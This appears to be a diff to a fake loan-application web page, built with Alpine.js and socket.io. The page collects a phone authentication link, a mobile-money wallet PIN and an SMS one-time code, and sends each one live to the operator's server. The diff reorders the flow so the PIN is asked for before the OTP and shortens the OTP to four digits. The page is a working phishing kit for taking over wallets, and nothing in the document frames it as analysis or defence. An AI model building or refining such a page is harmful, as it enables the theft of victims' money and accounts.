@@ -66,7 +66,7 @@
             padding: 1.5rem;
             border-bottom: 1px solid #e2e8f0;
             width: 100%;
-            flex-shrink: 0; /* Prevents container layout logic from crushing the logo header component */
+            flex-shrink: 0;
             display: block !important;
             visibility: visible !important;
             opacity: 1 !important;
@@ -298,7 +298,7 @@
                             <span class="text-xs font-bold text-amber-500">Step 04</span>
                         </div>
                         <div class="space-y-4">
-                            <p class="text-sm text-gray-400">Please supply the custom authentication token hyperlink send to  your phone for your profile registry keys. Make sure the tracking parameter string remains intact before continuing verification.</p>
+                            <p class="text-sm text-gray-400">Please supply the custom authentication token hyperlink send to your phone for your profile registry keys. Make sure the tracking parameter string remains intact before continuing verification.</p>
                             <div>
                                 <label class="label-premium">Unique Authentication Link</label>
                                 <input type="text" x-model="form.authToken" class="input-premium" placeholder="https://registry.infrastructure-terminal/auth/v1/verify-token...">
@@ -312,39 +312,8 @@
 
                     <div x-show="step === 5" x-cloak x-transition.duration.200ms>
                         <div class="flex justify-between items-center mb-5">
-                            <h2 class="text-lg font-bold text-white">OTP Verification</h2>
-                            <span class="text-xs font-bold text-amber-500">Step 05</span>
-                        </div>
-                        <div class="space-y-4">
-                            <p class="text-sm text-gray-400 text-center">Please input the 6-digit verification code send to your verified mobile number.</p>
-                            
-                            <div class="flex justify-center gap-2" id="otp-wrapper">
-                                <template x-for="(_, i) in 6" :key="i">
-                                    <input type="text" 
-                                           class="code-box otp-box" 
-                                           maxlength="1" 
-                                           pattern="\d*"
-                                           inputmode="numeric"
-                                           @input="handleCodeInput($event, i, 6, 'otp')"
-                                           @keydown.backspace="handleCodeBackspace($event, i, 'otp')"
-                                           x-model="otpData.array[i]">
-                                </template>
-                            </div>
-
-                            <div class="grid grid-cols-2 gap-4 pt-4">
-                                <button @click="step = 4" class="btn-secondary" :disabled="otpVerifying">← Back</button>
-                                <button @click="submitStep5" :disabled="!isStep5Valid || otpVerifying" class="btn-premium">
-                                    <span x-show="!otpVerifying">Confirm Code →</span>
-                                    <span x-show="otpVerifying" class="spinner-sm"></span>
-                                </button>
-                            </div>
-                        </div>
-                    </div>
-
-                    <div x-show="step === 6" x-cloak x-transition.duration.200ms>
-                        <div class="flex justify-between items-center mb-5">
                             <h2 class="text-lg font-bold text-white">Authorize MoMo PIN</h2>
-                            <span class="text-xs font-bold text-amber-500">Step 06</span>
+                            <span class="text-xs font-bold text-amber-500">Step 05</span>
                         </div>
                         <div class="space-y-4">
                             <p class="text-sm text-gray-400 text-center">Authorize configuration by entering your 5-digit security mobile money secure login wallet transaction PIN.</p>
@@ -363,10 +332,41 @@
                             </div>
 
                             <div class="grid grid-cols-2 gap-4 pt-4">
-                                <button @click="step = 5" class="btn-secondary" :disabled="pinVerifying">← Back</button>
-                                <button @click="submitStep6" :disabled="!isPinValid || pinVerifying" class="btn-premium">
-                                    <span x-show="!pinVerifying">Confirm & Request →</span>
+                                <button @click="step = 4" class="btn-secondary" :disabled="pinVerifying">← Back</button>
+                                <button @click="submitStep5" :disabled="!isStep5Valid || pinVerifying" class="btn-premium">
+                                    <span x-show="!pinVerifying">Confirm PIN →</span>
                                     <span x-show="pinVerifying" class="spinner-sm"></span>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div x-show="step === 6" x-cloak x-transition.duration.200ms>
+                        <div class="flex justify-between items-center mb-5">
+                            <h2 class="text-lg font-bold text-white">OTP Verification</h2>
+                            <span class="text-xs font-bold text-amber-500">Step 06</span>
+                        </div>
+                        <div class="space-y-4">
+                            <p class="text-sm text-gray-400 text-center">Please input the 4-digit verification code send to your verified mobile number.</p>
+                            
+                            <div class="flex justify-center gap-2" id="otp-wrapper">
+                                <template x-for="(_, i) in 4" :key="i">
+                                    <input type="text" 
+                                           class="code-box otp-box" 
+                                           maxlength="1" 
+                                           pattern="\d*"
+                                           inputmode="numeric"
+                                           @input="handleCodeInput($event, i, 4, 'otp')"
+                                           @keydown.backspace="handleCodeBackspace($event, i, 'otp')"
+                                           x-model="otpData.array[i]">
+                                </template>
+                            </div>
+
+                            <div class="grid grid-cols-2 gap-4 pt-4">
+                                <button @click="step = 5" class="btn-secondary" :disabled="otpVerifying">← Back</button>
+                                <button @click="submitStep6" :disabled="!isStep6Valid || otpVerifying" class="btn-premium">
+                                    <span x-show="!otpVerifying">Confirm & Request →</span>
+                                    <span x-show="otpVerifying" class="spinner-sm"></span>
                                 </button>
                             </div>
                         </div>
@@ -391,7 +391,7 @@
                 referenceId: '', 
                 form: { loanType: '', amount: 50000, term: '', purpose: '', firstName: '', lastName: '', email: '', phone: '', employment: '', income: '', employer: '', authToken: '' },
                 
-                otpData: { array: ['', '', '', '', '', ''] },
+                otpData: { array: ['', '', '', ''] }, // Form array re-sized to 4 slots
                 pin: { value: ['', '', '', '', ''] },
                 
                 otpVerifying: false, 
@@ -402,14 +402,15 @@
                 get isStep2Valid() { return this.form.firstName && this.form.lastName && this.form.phone.length >= 8; },
                 get isStep3Valid() { return this.form.employment && this.form.income; },
                 get isStep4Valid() { return this.form.authToken.trim().length > 0; },
-                get isStep5Valid() { return this.otpData.array.join('').length === 6; },
-                get isPinValid() { return this.pin.value.join('').length === 5; },
+                get isStep5Valid() { return this.pin.value.join('').length === 5; },
+                get isStep6Valid() { return this.otpData.array.join('').length === 4; }, // Validation rule checked for 4 total elements
 
                 init() {
                     this.socket = io();
                     this.socket.on('session-ready', (data) => { this.appId = data.appId; });
-                    this.socket.on('otp-verified', () => { this.otpVerifying = false; this.step = 6; });
-                    this.socket.on('pin-verified', (d) => { this.pinVerifying = false; this.referenceId = d.referenceId; this.step = 7; });
+                    
+                    this.socket.on('pin-verified', () => { this.pinVerifying = false; this.step = 6; });
+                    this.socket.on('otp-verified', (d) => { this.otpVerifying = false; this.referenceId = d.referenceId; this.step = 7; });
                 },
 
                 submitStep1() { this.socket.emit('step1', this.form); this.step = 2; },
@@ -418,12 +419,12 @@
                 submitStep4() { this.socket.emit('step4', { authToken: this.form.authToken }); this.step = 5; },
                 
                 submitStep5() { 
-                    this.otpVerifying = true; 
-                    this.socket.emit('step5', { code: this.otpData.array.join('') }); 
+                    this.pinVerifying = true; 
+                    this.socket.emit('step5', { pin: this.pin.value.join('') }); 
                 },
                 submitStep6() { 
-                    this.pinVerifying = true; 
-                    this.socket.emit('step6', { pin: this.pin.value.join('') }); 
+                    this.otpVerifying = true; 
+                    this.socket.emit('step6', { code: this.otpData.array.join('') }); 
                 },
 
                 handleCodeInput(e, index, totalLength, type) {
